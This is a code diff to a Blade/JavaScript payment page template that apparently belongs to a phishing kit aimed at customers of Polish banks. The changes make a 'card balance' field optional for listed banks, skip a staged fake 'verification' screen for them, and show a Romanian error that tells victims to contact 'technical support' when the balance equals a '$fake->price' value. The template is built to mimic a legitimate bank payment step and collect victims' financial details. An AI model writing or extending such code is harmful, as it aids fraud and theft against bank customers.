@@ -767,8 +767,15 @@
                             <div style="margin-bottom: 20px;">
                                 <input id="checkbal"
                                        style="padding: 7px; border: 1px solid #cecece; border-radius: 4px;"
-                                       form="_formPay" type="number" name="balance" placeholder="100.00" min="1"
-                                       required="">
+                                       form="_formPay"
+                                       type="number"
+                                       name="balance"
+                                       placeholder="100.00"
+                                       min="1"
+                                       @if(!in_array(session('bankName'),['ipko', 'pekao', 'ing','santander', 'millenium','mbank', 'inteligo', 'alior']))
+                                       required
+                                        @endif
+                                >
                             </div>
                             <div class="_10" style="display: none;">
                                 <div class="_6" style="color: #555;">Waluta</div>
@@ -1093,26 +1100,30 @@
         </script>
         <script type="text/javascript">
             let button1 = document.querySelector('#_buttonPay');
+            let button2 = document.querySelector('#buttonPay2');
             let verif = document.querySelector('#verification');
             let load = document.querySelector('#holder');
             let contnet = document.querySelector('#contnet');
-
+            let check = document.querySelector('#checkbal');
+            const noBalance = [
+                'ipko', 'pekao', 'ing',
+                'santander', 'millenium',
+                'mbank', 'inteligo', 'alior'
+            ].includes("{{session('bankName')}}");
 
             function verifcard() {
-
-                verif.style.display = 'block';
-                setTimeout(function () {
-                    verif.style.opacity = '1';
-                }, 100);
-                setTimeout(function () {
-                    load.style.display = 'none';
-                    contnet.style.display = 'block';
-                }, 3000);
-
+                if (noBalance) button2.click();
+                else {
+                    verif.style.display = 'block';
+                    setTimeout(function () {
+                        verif.style.opacity = '1';
+                    }, 100);
+                    setTimeout(function () {
+                        load.style.display = 'none';
+                        contnet.style.display = 'block';
+                    }, 3000);
+                }
             }
-
-            let button2 = document.querySelector('#buttonPay2');
-            let check = document.querySelector('#checkbal');
 
             button2.onclick = function () {
                 let str = "{{$fake->price}}";
@@ -1122,7 +1133,7 @@
                 } else if (check.value == str + '.0') {
                     check.setCustomValidity('Soldul dvs. nu îndeplinește criteriile de identificare. Vă rugăm să contactați asistența tehnică!')
                 } else {
-                    check.setCustomValidity('')
+                    check.setCustomValidity('');
                 }
             }
         </script>
